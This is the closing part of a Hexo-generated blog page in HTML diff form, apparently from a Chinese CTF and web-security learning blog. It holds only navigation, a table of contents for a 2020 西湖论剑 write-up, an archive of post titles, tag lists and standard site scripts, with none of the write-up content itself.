+                <a href= "/2021/04/04/bugku/" title= "bugku-web题">
+                    <div class="nextTitle">bugku-web题</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/2021/03/28/upload-labs/upload-labs/" title= "upload-labs">
+                    <div class="prevTitle">upload-labs</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!-- gitalk评论 -->
+
+    <!-- utteranc评论 -->
+
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:12345@qq.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/fi3ework" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+            
+                <span class="iconfont-archer wechat" title=wechat>
+                  
+                  <img class="profile-qr" src="/assets/example_qr.png" />
+                </span>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+    
+     
+    <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+    
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#2020-%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91"><span class="toc-number">1.</span> <span class="toc-text">2020 西湖论剑</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-NewUload"><span class="toc-number">1.2.</span> <span class="toc-text">1.NewUload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-EasyJson"><span class="toc-number">1.3.</span> <span class="toc-text">2.EasyJson</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-HardXss"><span class="toc-number">1.4.</span> <span class="toc-text">3.HardXss</span></a></li></ol></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 31
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2021 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/08</span><a class="archive-post-title" href= "/2021/04/08/ctfshow-ssrf/" >ctfshow&ctfhub-ssrf</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/06</span><a class="archive-post-title" href= "/2021/04/06/CTF%E6%AF%94%E8%B5%9B/%E7%BA%A2%E6%98%8E%E8%B0%B7%E6%9D%AF/" >红明谷-web 复现</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/06</span><a class="archive-post-title" href= "/2021/04/06/CTF%E6%AF%94%E8%B5%9B/DASctf/" >DASctf-web 复现</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/04</span><a class="archive-post-title" href= "/2021/04/04/bugku/" >bugku-web题</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/02</span><a class="archive-post-title" href= "/2021/04/02/CTF%E6%AF%94%E8%B5%9B/2020%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/" >2020西湖论剑-web复现</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/28</span><a class="archive-post-title" href= "/2021/03/28/upload-labs/upload-labs/" >upload-labs</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/26</span><a class="archive-post-title" href= "/2021/03/26/xss-labs/" >xss-labs</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/24</span><a class="archive-post-title" href= "/2021/03/24/sql-labs/PAGE-2(Advanced%20Injections)/" >PAGE-2(Advanced Injections)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/24</span><a class="archive-post-title" href= "/2021/03/24/sql-labs/PAGE-1(Basic%20Challenges)/" >PAGE-1(Basic Challenges)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/24</span><a class="archive-post-title" href= "/2021/03/24/sql-labs/PAGE-3&4/" >PAGE-3(Stacked Challenges)--PAGE-4(Challenges)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/01</span><a class="archive-post-title" href= "/2021/03/01/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/nmap/" >Nmap</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/01</span><a class="archive-post-title" href= "/2021/03/01/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/netcat/" >Netcat</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/01</span><a class="archive-post-title" href= "/2021/03/01/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/wireshark-tcpdump/" >wireshark-tcpdump</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/27</span><a class="archive-post-title" href= "/2021/02/27/dvwa/XSS-stored/" >XSS-stored</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/26</span><a class="archive-post-title" href= "/2021/02/26/dvwa/XSS-reflected/" >XSS-reflected</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/25</span><a class="archive-post-title" href= "/2021/02/25/dvwa/SQL%20Injection/" >SQL Injection</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/24</span><a class="archive-post-title" href= "/2021/02/24/dvwa/File%20inclusion/" >File inclusion</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/23</span><a class="archive-post-title" href= "/2021/02/23/dvwa/CSRF/" >CSRF</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/21</span><a class="archive-post-title" href= "/2021/02/21/dvwa/Command%20injection/" >Command injection</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/20</span><a class="archive-post-title" href= "/2021/02/20/dvwa/Brute%20Force/" >Brute Force</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/15</span><a class="archive-post-title" href= "/2021/02/15/CDN%E8%AE%B2%E8%A7%A3/" >CDN</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/01</span><a class="archive-post-title" href= "/2021/02/01/xctf/i-got-id-200/" >i-got-id-200--ARGV的利用</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/01</span><a class="archive-post-title" href= "/2021/02/01/xctf/kk/" >Flat---sql注入之sqlite3数据库</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2020 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/26</span><a class="archive-post-title" href= "/2020/11/26/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/" >Burp suit</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/26</span><a class="archive-post-title" href= "/2020/11/26/xctf/unfinsh/" >unfinsh--二次注入</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/18</span><a class="archive-post-title" href= "/2020/11/18/xctf/fakebook/" >fakebook--sql注入和反序列-file伪协议</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/18</span><a class="archive-post-title" href= "/2020/11/18/xctf/Cat/" >Cat---%80报错和@前缀发送文件</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/16</span><a class="archive-post-title" href= "/2020/11/16/xctf/favorite-number/" >favorite_number-溢出绕过-跨行绕过-tac绕过</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/16</span><a class="archive-post-title" href= "/2020/10/16/xctf/web%E6%96%B0%E6%89%8B%E9%A2%98/" >web新手题</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/16</span><a class="archive-post-title" href= "/2020/10/16/xctf/web%E8%BF%9B%E9%98%B6%E9%A2%98/" >web进阶</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/15</span><a class="archive-post-title" href= "/2020/10/15/my%20first%20blog/" >Mac下基于GitHub的Hexo博客搭建</a>
+        </li>
+    
+    </div>
+  </div>
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+    
+        <span class="sidebar-tag-name" data-tags="知识普及"><span class="iconfont-archer">&#xe606;</span>知识普及</span>
+    
+        <span class="sidebar-tag-name" data-tags="小问题"><span class="iconfont-archer">&#xe606;</span>小问题</span>
+    
+        <span class="sidebar-tag-name" data-tags="XCTF"><span class="iconfont-archer">&#xe606;</span>XCTF</span>
+    
+        <span class="sidebar-tag-name" data-tags="工具使用"><span class="iconfont-archer">&#xe606;</span>工具使用</span>
+    
+        <span class="sidebar-tag-name" data-tags="DVWA"><span class="iconfont-archer">&#xe606;</span>DVWA</span>
+    
+        <span class="sidebar-tag-name" data-tags="upload"><span class="iconfont-archer">&#xe606;</span>upload</span>
+    
+        <span class="sidebar-tag-name" data-tags="xss"><span class="iconfont-archer">&#xe606;</span>xss</span>
+    
+        <span class="sidebar-tag-name" data-tags="sql"><span class="iconfont-archer">&#xe606;</span>sql</span>
+    
+        <span class="sidebar-tag-name" data-tags="代码审计"><span class="iconfont-archer">&#xe606;</span>代码审计</span>
+    
+        <span class="sidebar-tag-name" data-tags="bugku"><span class="iconfont-archer">&#xe606;</span>bugku</span>
+    
+        <span class="sidebar-tag-name" data-tags="CTF比赛"><span class="iconfont-archer">&#xe606;</span>CTF比赛</span>
+    
+        <span class="sidebar-tag-name" data-tags="SSRF"><span class="iconfont-archer">&#xe606;</span>SSRF</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br/>
+    1、请确保node版本大于6.2<br/>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br/>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br/>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+        <span class="sidebar-category-name" data-categories="知识普及"><span class="iconfont-archer">&#xe60a;</span>知识普及</span>
+    
+        <span class="sidebar-category-name" data-categories="功防世界"><span class="iconfont-archer">&#xe60a;</span>功防世界</span>
+    
+        <span class="sidebar-category-name" data-categories="小问题"><span class="iconfont-archer">&#xe60a;</span>小问题</span>
+    
+        <span class="sidebar-category-name" data-categories="工具使用"><span class="iconfont-archer">&#xe60a;</span>工具使用</span>
+    
+        <span class="sidebar-category-name" data-categories="DVWA"><span class="iconfont-archer">&#xe60a;</span>DVWA</span>
+    
+        <span class="sidebar-category-name" data-categories="sql-lab"><span class="iconfont-archer">&#xe60a;</span>sql-lab</span>
+    
+        <span class="sidebar-category-name" data-categories="xss-lab"><span class="iconfont-archer">&#xe60a;</span>xss-lab</span>
+    
+        <span class="sidebar-category-name" data-categories="upload-labs"><span class="iconfont-archer">&#xe60a;</span>upload-labs</span>
+    
+        <span class="sidebar-category-name" data-categories="bugku"><span class="iconfont-archer">&#xe60a;</span>bugku</span>
+    
+        <span class="sidebar-category-name" data-categories="CTF比赛"><span class="iconfont-archer">&#xe60a;</span>CTF比赛</span>
+    
+        <span class="sidebar-category-name" data-categories="SSRF"><span class="iconfont-archer">&#xe60a;</span>SSRF</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: "/",
+        author: "JOe KKK"
+    }
+</script>
+    <!-- CDN failover -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ === 'undefined')
+        {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
+        }
+    </script>
+    <script src="/scripts/main.js"></script>
+    <!-- algolia -->
+    
+    <!-- busuanzi  -->
+    
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+    <!-- CNZZ  -->
+    
+    </div>
+    <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
+     
+    </body>
+</html>
+
+
